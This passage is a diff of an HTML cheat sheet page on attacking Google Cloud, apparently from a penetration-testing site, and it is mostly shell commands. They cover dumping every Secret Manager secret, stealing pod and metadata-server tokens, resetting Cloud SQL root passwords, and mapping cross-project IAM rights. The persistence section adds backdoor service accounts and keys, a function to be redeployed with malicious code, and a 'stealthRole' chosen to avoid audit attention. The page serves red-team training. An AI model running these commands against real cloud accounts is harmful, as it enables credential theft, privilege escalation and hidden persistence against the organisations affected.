+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Functions often have hardcoded secrets and connection strings in source:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcloud functions describe FUNC --format<span class="o">=</span><span class="s1">&#39;value(sourceArchiveUrl,sourceUploadUrl,sourceRepository.sourceUrl)&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Or download via Console / gsutil. Then:</span>
+</span></span><span class="line"><span class="cl">grep -RIE <span class="s1">&#39;password|secret|token|api_key|connection&#39;</span> .
+</span></span></code></pre></div><h3 id="secret-manager-bulk-dump" data-heading-permalink="true"><span class="heading-content">Secret Manager bulk dump</span>
+    <a class="heading-permalink" href="#secret-manager-bulk-dump" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">for</span> s in <span class="k">$(</span>gcloud secrets list --format<span class="o">=</span><span class="s1">&#39;value(name)&#39;</span><span class="k">)</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="s2">&#34;=== </span><span class="nv">$s</span><span class="s2"> ===&#34;</span>
+</span></span><span class="line"><span class="cl">  gcloud secrets versions access latest --secret<span class="o">=</span><span class="s2">&#34;</span><span class="nv">$s</span><span class="s2">&#34;</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></div><h3 id="gke-pod---node-escape" data-heading-permalink="true"><span class="heading-content">GKE pod -&gt; node escape</span>
+    <a class="heading-permalink" href="#gke-pod---node-escape" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Once in a pod, check for token, mounted secrets, hostPath mounts:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## In-pod token:</span>
+</span></span><span class="line"><span class="cl">cat /var/run/secrets/kubernetes.io/serviceaccount/token
+</span></span><span class="line"><span class="cl"><span class="c1">## API check:</span>
+</span></span><span class="line"><span class="cl">curl -k https://kubernetes.default.svc/api/v1/namespaces/default/pods <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -H <span class="s2">&#34;Authorization: Bearer </span><span class="k">$(</span>cat /var/run/secrets/kubernetes.io/serviceaccount/token<span class="k">)</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Look for hostPath or privileged pods to break out</span>
+</span></span></code></pre></div><p>GKE Workload Identity binds K8s SAs to GCP SAs:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## If your pod has workload identity to a GCP SA:</span>
+</span></span><span class="line"><span class="cl">curl -H <span class="s2">&#34;Metadata-Flavor: Google&#34;</span> <span class="s2">&#34;http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## This returns a GCP token for the bound SA, not the K8s SA</span>
+</span></span></code></pre></div><h3 id="cloud-sql" data-heading-permalink="true"><span class="heading-content">Cloud SQL</span>
+    <a class="heading-permalink" href="#cloud-sql" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcloud sql instances list
+</span></span><span class="line"><span class="cl"><span class="c1">## Get connection info, often has default password:</span>
+</span></span><span class="line"><span class="cl">gcloud sql instances describe INST
+</span></span><span class="line"><span class="cl"><span class="c1">## Reset root password if you have rights:</span>
+</span></span><span class="line"><span class="cl">gcloud sql users set-password root --host<span class="o">=</span>% --instance<span class="o">=</span>INST --password<span class="o">=</span><span class="s1">&#39;NewP@ss!&#39;</span>
+</span></span></code></pre></div><h2 id="vii-tooling" data-heading-permalink="true"><span class="heading-content">vii. Tooling</span>
+    <a class="heading-permalink" href="#vii-tooling" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="gcp_scanner" data-heading-permalink="true"><span class="heading-content">GCP_Scanner</span>
+    <a class="heading-permalink" href="#gcp_scanner" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Multi-purpose enum tool, equivalent to ScoutSuite/Prowler for GCP:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 scanner.py -o output -p <span class="nv">$PROJECT</span> -k key.json
+</span></span></code></pre></div><h3 id="gcpbucketbrute" data-heading-permalink="true"><span class="heading-content">gcpbucketbrute</span>
+    <a class="heading-permalink" href="#gcpbucketbrute" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>For storage discovery, see <a href="https://jinpwn.dev/cheatsheets/cloud/cloud-storage/">Cloud Storage</a>
+.</p>
+<h3 id="gcp_enum" data-heading-permalink="true"><span class="heading-content">gcp_enum</span>
+    <a class="heading-permalink" href="#gcp_enum" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcp_enum.sh
+</span></span></code></pre></div><h3 id="gcp_iam_collector--pmapper-style" data-heading-permalink="true"><span class="heading-content">gcp_iam_collector / PMapper-style</span>
+    <a class="heading-permalink" href="#gcp_iam_collector--pmapper-style" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>For graphing privesc paths (newer, evolving). Search GitHub for current best.</p>
+<h3 id="gcpgoat" data-heading-permalink="true"><span class="heading-content">gcpgoat</span>
+    <a class="heading-permalink" href="#gcpgoat" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Vulnerable-by-design GCP environment to practice these techniques.</p>
+<h2 id="viii-cross-project-access" data-heading-permalink="true"><span class="heading-content">viii. Cross-project access</span>
+    <a class="heading-permalink" href="#viii-cross-project-access" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>GCP IAM can span projects, folders, and org. A common misconfig: a project&rsquo;s SA has Editor on a different project via inheritance.</p>
+<p>Find cross-project bindings:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## List all projects you can see:</span>
+</span></span><span class="line"><span class="cl">gcloud projects list
+</span></span><span class="line"><span class="cl"><span class="c1">## For each, get IAM and look for your principal:</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> p in <span class="k">$(</span>gcloud projects list --format<span class="o">=</span><span class="s1">&#39;value(projectId)&#39;</span><span class="k">)</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">  gcloud projects get-iam-policy <span class="s2">&#34;</span><span class="nv">$p</span><span class="s2">&#34;</span> --flatten<span class="o">=</span><span class="s1">&#39;bindings[].members&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">    --filter<span class="o">=</span><span class="s2">&#34;bindings.members:user:you@example.com OR bindings.members:serviceAccount:</span><span class="nv">$SA</span><span class="s2">&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">    --format<span class="o">=</span><span class="s1">&#39;value(bindings.role,bindings.members)&#39;</span> 2&gt;/dev/null <span class="p">|</span> sed <span class="s2">&#34;s/^/</span><span class="nv">$p</span><span class="s2"> /&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></div><p>Bindings at folder or org level cascade down - check those too:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcloud resource-manager folders get-iam-policy FOLDER_ID
+</span></span><span class="line"><span class="cl">gcloud organizations get-iam-policy ORG_ID
+</span></span></code></pre></div><h2 id="ix-persistence" data-heading-permalink="true"><span class="heading-content">ix. Persistence</span>
+    <a class="heading-permalink" href="#ix-persistence" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="create-your-own-service-account" data-heading-permalink="true"><span class="heading-content">Create your own service account</span>
+    <a class="heading-permalink" href="#create-your-own-service-account" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcloud iam service-accounts create backup-svc --display-name<span class="o">=</span><span class="s1">&#39;Backup&#39;</span>
+</span></span><span class="line"><span class="cl">gcloud projects add-iam-policy-binding <span class="nv">$PROJECT</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --member<span class="o">=</span>serviceAccount:backup-svc@<span class="nv">$PROJECT</span>.iam.gserviceaccount.com <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --role<span class="o">=</span>roles/owner
+</span></span><span class="line"><span class="cl">gcloud iam service-accounts keys create backup.json <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --iam-account<span class="o">=</span>backup-svc@<span class="nv">$PROJECT</span>.iam.gserviceaccount.com
+</span></span><span class="line"><span class="cl"><span class="c1">## Save backup.json</span>
+</span></span></code></pre></div><h3 id="add-a-key-to-an-existing-sa" data-heading-permalink="true"><span class="heading-content">Add a key to an existing SA</span>
+    <a class="heading-permalink" href="#add-a-key-to-an-existing-sa" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Less visible than creating a new SA:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcloud iam service-accounts keys create attacker.json --iam-account<span class="o">=</span>existing-svc@<span class="nv">$PROJECT</span>.iam.gserviceaccount.com
+</span></span><span class="line"><span class="cl">gcloud iam service-accounts keys list --iam-account<span class="o">=</span>existing-svc@<span class="nv">$PROJECT</span>.iam.gserviceaccount.com
+</span></span></code></pre></div><p>Up to 10 keys per SA. Defenders rarely audit individual key serial numbers.</p>
+<h3 id="long-lived-backdoor-via-cloud-function-trigger" data-heading-permalink="true"><span class="heading-content">Long-lived backdoor via Cloud Function trigger</span>
+    <a class="heading-permalink" href="#long-lived-backdoor-via-cloud-function-trigger" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Deploy a function that&rsquo;s triggered by a Cloud Storage event, Pub/Sub, or a scheduler. Modify it later to do anything when triggered:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcloud functions deploy backup-handler <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --runtime<span class="o">=</span>python311 --trigger-bucket<span class="o">=</span>BUCKET <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --service-account<span class="o">=</span>admin-sa@<span class="nv">$PROJECT</span>.iam.gserviceaccount.com
+</span></span><span class="line"><span class="cl"><span class="c1">## Anytime, redeploy with malicious code, then push an object to the bucket to trigger</span>
+</span></span></code></pre></div><h3 id="custom-role-you-own" data-heading-permalink="true"><span class="heading-content">Custom role you &ldquo;own&rdquo;</span>
+    <a class="heading-permalink" href="#custom-role-you-own" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>If you have <code>iam.roles.create</code>, make a role that grants only what you need, less audit attention than <code>roles/owner</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcloud iam roles create stealthRole --project<span class="o">=</span><span class="nv">$PROJECT</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --permissions<span class="o">=</span>iam.serviceAccountKeys.create,resourcemanager.projects.setIamPolicy <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --stage<span class="o">=</span>GA
+</span></span><span class="line"><span class="cl">gcloud projects add-iam-policy-binding <span class="nv">$PROJECT</span> --member<span class="o">=</span>serviceAccount:backup-svc@... --role<span class="o">=</span>projects/<span class="nv">$PROJECT</span>/roles/stealthRole
+</span></span></code></pre></div><h2 id="x-detection--logging" data-heading-permalink="true"><span class="heading-content">x. Detection / logging</span>
+    <a class="heading-permalink" href="#x-detection--logging" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>GCP Cloud Audit Logs capture admin activity by default. Data Access logs (read operations) are usually off - read-heavy enum often goes unseen.</p>
+<p>Quick check on what&rsquo;s logged:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcloud logging logs list
+</span></span><span class="line"><span class="cl">gcloud logging <span class="nb">read</span> <span class="s1">&#39;severity&gt;=ERROR&#39;</span> --limit<span class="o">=</span><span class="m">10</span>
+</span></span></code></pre></div><p>Common detection signals:</p>
+<ul>
+<li>New SA keys (Cloud Audit logs)</li>
+<li>IAM binding changes (Cloud Audit logs)</li>
+<li>Cross-project impersonation patterns</li>
+<li>Workload Identity Federation abuses</li>
+</ul>
+<h2 id="xi-decision-tree" data-heading-permalink="true"><span class="heading-content">xi. Decision tree</span>
+    <a class="heading-permalink" href="#xi-decision-tree" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>You have GCP creds, now what?</p>
+<ol>
+<li><code>gcloud auth list</code> + <code>gcloud projects list</code> → know your identity and visible projects</li>
+<li>Try <code>gcloud projects get-iam-policy</code> for each project, find your principal&rsquo;s roles</li>
+<li>Check for <code>iam.serviceAccounts.*</code> permissions → privesc via impersonation or key creation</li>
+<li>Check for <code>*.actAs</code> + create-something rights → privesc via Function/VM/Run with target SA</li>
+<li>No direct privesc? → enumerate Secret Manager, storage buckets, Cloud SQL for stored creds</li>
+<li>Cross-project rights? → look at folder/org level IAM</li>
+<li>Persistence → key on existing SA (subtle) or new SA with custom role</li>
+</ol>
+
+        </div>
+
+        
+          <nav class="cheatsheet-pager is-prev-only" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/cloud/azure/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Previous</span>
+              <span class="cheatsheet-pager-title">Azure</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a></nav>
+        
+      </div>
+    </div>
+  </article>
+  
+
+  </main>
+  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M12 18V6"></path>
+      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
+    </svg>
+  </button>
+  <footer class="site-footer">
+  <p>&copy; 2026 JinPwn</p>
+</footer>
+
+</body>
+</html>
